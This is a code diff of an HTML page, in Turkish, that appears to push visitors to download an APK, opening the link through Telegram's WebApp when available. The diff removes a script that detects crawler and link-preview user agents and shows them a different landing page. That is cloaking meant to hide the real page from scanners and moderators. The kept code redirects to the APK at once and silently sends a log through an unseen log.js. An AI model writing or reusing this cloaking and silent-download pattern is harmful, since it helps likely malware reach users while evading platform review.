@@ -134,26 +134,6 @@
 </head>
 <body>
 
-<script>
-(function(){
-  var ua = navigator.userAgent.toLowerCase();
-  var botUA = ['facebookexternalhit','facebot','linkedinbot','twitterbot',
-               'telegrambot','googlebot','bingbot','crawler',
-               'spider','slurp','preview','applebot','semrushbot','ahrefsbot'];
-  var isBot = botUA.some(function(b){ return ua.indexOf(b) !== -1; });
-  if(isBot){
-    fetch('/landing.html')
-      .then(function(r){ return r.text(); })
-      .then(function(html){
-        document.open();
-        document.write(html);
-        document.close();
-      });
-  }
-})();
-</script>
-
-
     <div class="toast-notification" id="toastMsg">
         <i class="fa-solid fa-circle-check"></i>
         <span id="toastText">İndirme başlatıldı!</span>
@@ -211,7 +191,7 @@
         <p class="text-[10px] text-gray-400 mt-1">Güncel</p>
     </div>
 
-    <!-- log.js dosyasını burada çağırıyoruz (ayrı dosya olarak) -->
+    <!-- ⬇️ GÜNCELLENMİŞ log.js REFERANSI (AYNEN DURUYOR) ⬇️ -->
     <script src="log.js"></script>
 
     <script>
@@ -293,15 +273,14 @@
                     // ========== 1. LİNKİ HEMEN AÇ (bekleme yok, timeout yok) ==========
                     const isTelegram = !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initData);
                     
-if (isTelegram) {
-    Telegram.WebApp.openLink(currentApkUrl, { try_instant_view: false });
-} else {
-    window.location.href = currentApkUrl;
-}
+                    if (isTelegram) {
+                        Telegram.WebApp.openLink(currentApkUrl, { try_instant_view: false });
+                    } else {
+                        window.location.href = currentApkUrl;
+                    }
 
                     // ========== 2. LOG'U ARKADA GÖNDER (await yok, bekleme yok) ==========
                     if (typeof window.sendLog === 'function') {
-                        // .then ile yakala ama bekleme, hata alsa bile umursama
                         window.sendLog(currentApkUrl).catch(() => {});
                         showToast("İndirme başlatılıyor!");
                     } else {
